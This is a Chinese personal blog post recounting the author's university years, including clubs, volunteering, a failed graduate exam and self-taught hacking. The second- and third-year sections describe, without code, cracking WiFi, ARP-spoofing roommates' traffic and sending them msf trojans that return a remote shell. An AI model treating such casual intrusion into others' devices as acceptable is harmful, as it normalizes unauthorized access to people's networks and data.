        <content type="html"><![CDATA[<p>#0x00 前言</p><p>​    我大学读的是计算机科学与技术专业，说实话，这个专业真的太大了，囊括了整个计算机的大类，所以学校的课程中，什么都学，什么计算机导论，离散数学，<code>Java</code>，<code>C</code>，<code>C#</code>，数据库，<code>JSP</code>等等，但是教的都是一些基本的皮毛知识，有些连入门都不算，所以要想在某个知识有所突破，基本上都是靠自己去图书馆借书回来学习。</p><a id="more"></a><p>​    在大学中，如果按照学习来分类的话，有这么几个人。第一类人——学神，听过这类人特别牛X，不光学习好，年年拿国家励志奖学金，而且还有这种职位，比如学社会主席，某某大赛领队人….；第二类人——学霸，他们是上课认真听讲，课下不用复习，靠前突击复习。期末稳稳优秀，我宿舍就有几个，哈哈哈，我们宿舍在班上也算是男生中的学霸宿舍了；第三类人——学渣，他们是上课玩手机，下课打游戏，吃饭叫外卖，考试靠小抄。</p><h1 id="0x01-大一"><a href="#0x01-大一" class="headerlink" title="0x01 大一"></a>0x01 大一</h1><p>​    大一小萌新，充满着对大学的憧憬，然后大一也是最惨的，学生会中部长对大一干部喝来喝去，一副官腔样，贼恶心。除了这些大一小萌新还会在志愿者协会参加各种户外和校内的志愿者活动，只为了志愿者证书上的那60小时志愿工时，不过我在大一的时候为了多见见世面，参加了不少志愿活动，大大小小的积累下来有100多个工时。不过最后被我弄丢了╮(╯▽╰)╭然后就是我在大学还参加一个社团叫剪纸协会（非物质文化遗产奥），不过我在里面也是混日子，没有学到多少技能，到是吧脸皮练厚了，哈哈哈。这就样大一结束。</p><p>#0x02 大二</p><p>​    大二，学习上的事就暂且不谈了，都一样，周一周五上课，周六周日放假。不过不同的人大二的生活就开始不一样了。要是说很多人在大一的时候都差不多，一起参加了学生会，社团什么的，到了大二以后，换届的换届，退会的退会，有幸的是，我当上了剪纸协会的副会长，一般一个社会会有4个负责人，1个会长，两个副会长，还有一个理事长。反正都是管事的，每次社团需要举办什么活动，我们几个负责人都要讨论一下活动的举办等等一系列问题，话说，举办活动还是挺有意思的，不过举办活动前后事情也是挺多的。需要外联部去拉赞助，需要组织部写策划案，需要剪纸部和纸艺创作部出作品展览，协调活动现场人员情况等等。就这样，大二我除了每天上课以外，其余的时光都是在协会中度过了，不过我喜欢去图书馆借点书在协会里面看书，一个人安静的看书，还有空调，也是一种享受！皮卡皮卡^v^ 。</p><p>​    在一次偶然的机遇中，我碰到了学校计算机协会的会长，在于他交流的过程中，他和我讲了一些有关黑客的东西，其中就涉及到了各种技术，什么<code>ip</code>定位（小皮毛），渗透测试、<code>kali Linux</code>等，当时的我是第一次接触到渗透测试这个词，也没有听过<code>kali Linux</code>，只知道有软件测试和<code>Linux</code>系统这么一回事。当我从百度中搜索了有关这些词的信息后，开启了我新世界的大门。为了学习渗透，我在虚拟机中装上了<code>kali Linux</code>，这个过程在我摸索的过程了还是碰到了不少坑的，这里就不说了，装上<code>kali Linux</code>以后，第一个想法就是，我该怎么用，怎么去和电影里面的一样去黑别人的电脑？等等，于是在网上搜索了一些相关的资料和视频，开始学习<code>kali Linux</code>，其中，我研究最多的模块就是内网了，其实实际上就是局域网环境内的攻击，这些我是先拿我宿舍的室友和路由器开的刀，先是研究如何破解<code>WiFi</code>密码，然后破击成功后使用<code>nmap</code>扫描内网存活主机，使用<code>arp</code>欺骗局域网的主机，窃取局域网中用户的数据流量等等（这些其实不懂，就是跟着视频操作一遍，照葫芦画瓢，不懂原理），再去使用<code>nessus</code>扫描主机存在的漏洞，最后利用漏洞攻击系统等等（未成功过。:( ），在无线网破解这部分我曾经还在<code>freebuf</code>上发表一篇文章——如何使用<code>Airgeddon</code>找回<code>WiFi</code>密码 ，这篇文章从技术研究，文章的撰写发布花了我好几天的时间，在写文章的那天弄到3点在写完成，不过最后发表了，很开心。大二就说这么多吧，其他的大三再说。</p><p>#0x03 大三</p><p>​    时间很快，我到了大三，大三上学期不知道怎么回事，课少的可怜，所以我就有更多的时间来研究渗透测试的东西了，这段时间我研究了<code>msf</code>中的木马，具体技术也不是很懂，就是利用命令来生成木马，然后将木马发送给受害者，只要受害者点击了以后，我这边就可以反弹回来一个会话，俗称<code>shell</code>，在这里，我可以查看该用户主机中的所有信息（管理员权限），当初就是将这个给我的一个室友演示的，成功让他上船。然后两个人一起研究渗透测试，免杀，<code>Android</code>马等等，只是当初思维比较局限，不知道<code>web</code>层面的渗透，只知道有日战这么一说，但是具体的也不知道怎么日。。。。</p><p>​    大三下学期的课与上学期的课形成了鲜明的对比，基本上天天满课，有的时候晚上还要上课，这，让我在渗透测试方面的研究方面的研究时间大大减少，而且我在大三还萌生了考研的想法，所以，学习任务繁重啊。╮(╯▽╰)╭，不过幸运的是，我在大三过了六级，低分飘过，过了三级网络技术，还拿到了国家励志，也算是我的幸运之年了。皮卡皮卡(<em>^__^</em>) </p><p>#0x04 大四</p><p>​    考研，考研失败，经历就不分享了，免得误导小朋友。不过给出建议就是坚持，很多人在考研的后期都奔溃了，时间不够用，没有复习完，考场心态爆（我在考数学的时候心态崩过，然后出去洗把脸换个位置调整过来了），所以，一定要坚持，怎么也得熬到考研结束。说不定，你就成功了。哇咔咔！！！</p>]]></content>
      
      
      <categories>
          
          <category> 记录生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
